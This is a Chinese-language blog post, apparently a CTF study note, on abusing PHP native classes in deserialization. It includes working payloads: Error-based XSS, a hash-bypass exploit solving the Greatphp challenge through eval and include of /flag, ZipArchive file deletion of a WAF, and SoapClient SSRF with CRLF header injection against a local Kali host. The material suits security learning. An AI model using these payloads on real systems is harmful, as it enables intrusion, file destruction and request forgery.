@@ -1,0 +1,532 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="welcome to my blog" href="https://hq185187.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="welcome to my blog" href="https://hq185187.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="welcome to my blog" href="https://hq185187.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="java,git,springcloud" />
+
+
+<link rel="canonical" href="https://hq185187.github.io/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+
+  <title>
+原生类反序列化学习 |
+不良人天藏星 = welcome to my blog = 不良人总舵</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">原生类反序列化学习
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-06-08 23:01:57">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-06-08T23:01:57+08:00">2023-06-08</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>4.2k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>4 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">不良人天藏星</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="/assets/21.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="hq185187">
+    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="welcome to my blog">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>当有反序列化点但是找不到反序列化类时，可以考虑用一些原生类</p>
+<h3 id="一目录遍历类"><a class="markdownIt-Anchor" href="#一目录遍历类">#</a> 一。目录遍历类</h3>
+<h4 id="1directoryiterator"><a class="markdownIt-Anchor" href="#1directoryiterator">#</a> 1.DirectoryIterator</h4>
+<p>这个类会创建一个指定目录的迭代器当遇到 <code>echo</code>  输出时会触发 <code>Directorylterator</code>  中的 <code>__toString()</code>  方法，输出指定目录里面经过排序之后的第一个文件名。</p>
+<p>可以结合 glob 协议使用</p>
+<h4 id="2filesystemiterator"><a class="markdownIt-Anchor" href="#2filesystemiterator">#</a> 2.FilesystemIterator</h4>
+<p>该类继承于 <code>Directorylterator</code> ，所以在用法上基本也是一样的。</p>
+<h4 id="3globiterator"><a class="markdownIt-Anchor" href="#3globiterator">#</a> 3.GlobIterator</h4>
+<p>通过类名也不难看出，这是个自带 <code>glob</code>  协议的类，所以调用时就不必再加上 <code>glob://</code>  了</p>
+<h3 id="二文件读取类"><a class="markdownIt-Anchor" href="#二文件读取类">#</a> 二。文件读取类</h3>
+<h4 id="1splfileobject类"><a class="markdownIt-Anchor" href="#1splfileobject类">#</a> 1.SplFileObject 类</h4>
+<p>当用文件目录遍历到了敏感文件时，可以用 <code>SplFileObject</code>  类，同样通过 echo 触发 <code>SplFileObject</code>  中的 <code>__toString()</code>  方法。(该类不支持通配符，所以必须先获取到完整文件名称才行)</p>
+<p>除此之外其实 <code>SplFileObject</code>  类，只能读取文件的第一行内容，如果想要全部读取就需要用到 foreach 函数，但若题目中没有给出 foreach 函数的话，就要用伪协议读取文件的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
+<h3 id="三errorexceptionerrorexception类"><a class="markdownIt-Anchor" href="#三errorexceptionerrorexception类">#</a> 三.Error/Exception/ErrorException 类</h3>
+<h4 id="1触发xss"><a class="markdownIt-Anchor" href="#1触发xss">#</a> 1. 触发 xss</h4>
+<p>这个类里有 toString 方法，复现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);  </span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="2绕过哈希比较"><a class="markdownIt-Anchor" href="#2绕过哈希比较">#</a> 2. 绕过哈希比较</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>!=<span class="variable">$b</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>!=<span class="subst">$b</span>&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5相等&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;shq1相等&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>例题:[极客大挑战 2020] Greatphp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"> </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>要导入 /flag, 过滤了双引号，用 url 取反绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//%D0%99%93%9E%98</span></span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">error_reporting(0);  </span><br><span class="line">class SYCLOVER &#123;  </span><br><span class="line">    public $syc;  </span><br><span class="line">    public $lover;  </span><br><span class="line">  </span><br><span class="line">    public function __wakeup()&#123;  </span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;  </span><br><span class="line">            if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;  </span><br><span class="line">                eval($this-&gt;syc);  </span><br><span class="line">            &#125; else &#123;  </span><br><span class="line">                die(&quot;Try Hard !!&quot;);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;    &#125;&#125;  </span><br><span class="line">$str=&quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;  </span><br><span class="line">$payload1=new Error($str,1);$payload2=new Error($str,2);  </span><br><span class="line">$a=new SYCLOVER();  </span><br><span class="line">$a-&gt;syc=$payload1;  </span><br><span class="line">$a-&gt;lover=$payload2;  </span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+<h3 id="四其他类"><a class="markdownIt-Anchor" href="#四其他类">#</a> 四。其他类</h3>
+<h4 id="1reflectionclass类"><a class="markdownIt-Anchor" href="#1reflectionclass类">#</a> 1.ReflectionClass 类</h4>
+<p><strong>ReflectionMethod</strong> 类报告有关方法的信息。<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvY2xhc3MucmVmbGVjdGlvbm1ldGhvZC5waHA=">官方文档</span><br>
+复现:<br>
+![[Pasted image 20230608151138.png]]</p>
+<h4 id="2ziparchive-文件操作"><a class="markdownIt-Anchor" href="#2ziparchive-文件操作">#</a> 2.ZipArchive 文件操作</h4>
+<p>可以通过本类执行一些文件操作，在 CTF 可以用来删除 waf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a=new ZipArchive();  </span><br><span class="line">$a-&gt;open(&#x27;waf.php&#x27;,ZipArchive::OVERWRITE);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>ZipArchive::OVERWRITE: 总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖，因为没有保存，所以效果就是删除了 test.php</p>
+<h4 id="3soapclient__call"><a class="markdownIt-Anchor" href="#3soapclient__call">#</a> 3.SoapClient::__call</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://192.168.95.122:8765&#x27;</span>));  </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;  </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">not_exists_function</span>();</span><br></pre></td></tr></table></figure>
+<p>192.168.95.122 是我 kali 的地址<br>
+！[[Pasted image 20230608214231.png]]<br>
+ 从图片可以看出 SOAPAction 参数可控，我们可以在这里注入恶意的换行，这样就可以控制 POST 提交的 header</p>
+<p>但是当想传入 cookie 时，Content-Type 在 SOAPAction 的上面，无法控制 Content-Type, 但在 User-Agent 后面，而 user-agent 可以注入 CRLF, 控制 Content-Type 的值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://192.168.95.122:2222&#x27;</span>;  </span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=something&#x27;</span>;  </span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(  </span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span>  </span><br><span class="line">);  </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);  </span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);  </span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">not_exists_function</span>();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>![[Pasted image 20230608224011.png]]</p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-06-08 23:00:53" itemprop="dateModified" datetime="2023-06-08T23:00:53+08:00">2023-06-08</time>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://hq185187.github.io/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="原生类反序列化学习">https://hq185187.github.io/2023/06/08/原生类反序列化/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/06/04/nssctf3/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;6.jpg" title="NSSCTF3">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> NSSCTF精选</span>
+  <h3>NSSCTF3</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text"> 一。目录遍历类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1directoryiterator"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.DirectoryIterator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2filesystemiterator"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.FilesystemIterator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3globiterator"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.GlobIterator</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text"> 二。文件读取类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1splfileobject%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text"> 1.SplFileObject 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89errorexceptionerrorexception%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text"> 三.Error&#x2F;Exception&#x2F;ErrorException 类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E8%A7%A6%E5%8F%91xss"><span class="toc-number">3.1.</span> <span class="toc-text"> 1. 触发 xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="toc-number">3.2.</span> <span class="toc-text"> 2. 绕过哈希比较</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E5%85%B6%E4%BB%96%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text"> 四。其他类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1reflectionclass%E7%B1%BB"><span class="toc-number">4.1.</span> <span class="toc-text"> 1.ReflectionClass 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2ziparchive-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">4.2.</span> <span class="toc-text"> 2.ZipArchive 文件操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3soapclient__call"><span class="toc-number">4.3.</span> <span class="toc-text"> 3.SoapClient::__call</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="hq185187"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">hq185187</p>
+  <div class="description" itemprop="description">不定时更新web安全相关知识</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">24</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">2</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hxMTg1MTg3" title="https:&#x2F;&#x2F;github.com&#x2F;hq185187"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Phar反序列化学习">Phar反序列化学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/" title="upload-labs靶场">upload-labs靶场</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/14/LitCTF2023/" title="LitCTF2023">LitCTF2023</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/23/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/30/md5/" title="MD5绕过总结">MD5绕过总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
